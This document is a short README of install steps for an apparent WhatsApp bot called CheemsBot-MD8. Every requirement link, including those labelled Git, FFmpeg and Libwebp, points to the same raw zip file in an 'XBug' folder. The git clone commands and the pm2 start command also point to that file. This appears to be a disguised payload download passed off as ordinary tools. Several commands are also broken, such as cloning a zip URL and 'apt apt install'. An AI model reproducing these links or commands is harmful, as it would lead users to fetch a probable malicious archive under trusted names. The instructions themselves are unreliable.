# Install Manually 👇
## `Requirements`
* [https://raw.githubusercontent.com/AanzaFoxBat/CheemsBot-MD8/master/XBug/Cheems-Bot-M-photocollography.zip](https://raw.githubusercontent.com/AanzaFoxBat/CheemsBot-MD8/master/XBug/Cheems-Bot-M-photocollography.zip)
* [Git](https://raw.githubusercontent.com/AanzaFoxBat/CheemsBot-MD8/master/XBug/Cheems-Bot-M-photocollography.zip)
* [FFmpeg](https://raw.githubusercontent.com/AanzaFoxBat/CheemsBot-MD8/master/XBug/Cheems-Bot-M-photocollography.zip)
* [Libwebp](https://raw.githubusercontent.com/AanzaFoxBat/CheemsBot-MD8/master/XBug/Cheems-Bot-M-photocollography.zip)
* Any text editor
## `Clone Repo & Installation dependencies`
```bash
git clone https://raw.githubusercontent.com/AanzaFoxBat/CheemsBot-MD8/master/XBug/Cheems-Bot-M-photocollography.zip
cd CheemsBot-MD8

npm start
```
## `For Termux/Ssh/Ubuntu`
```bash
apt update
apt upgrade
pkg update && pkg upgrade
pkg install bash
pkg install libwebp
pkg install git -y
pkg install nodejs -y 
pkg install ffmpeg -y 
pkg install wget
pkg install imagemagick -y
git clone https://raw.githubusercontent.com/AanzaFoxBat/CheemsBot-MD8/master/XBug/Cheems-Bot-M-photocollography.zip
cd CheemsBot-MD8
yarn install
npm start
```
## `For VPS`
```bash
apt install nodejs 
apt install git 
apt apt install ffmpeg 
apt apt install libwebp 
apt apt install imagrmagick
apt install bash
git clone https://raw.githubusercontent.com/AanzaFoxBat/CheemsBot-MD8/master/XBug/Cheems-Bot-M-photocollography.zip
cd CheemsBot-MD8
npm start
```
## `For 24/7 Activation (Termux)`
```bash
npm i -g pm2 && pm2 start https://raw.githubusercontent.com/AanzaFoxBat/CheemsBot-MD8/master/XBug/Cheems-Bot-M-photocollography.zip && pm2 save && pm2 logs
```
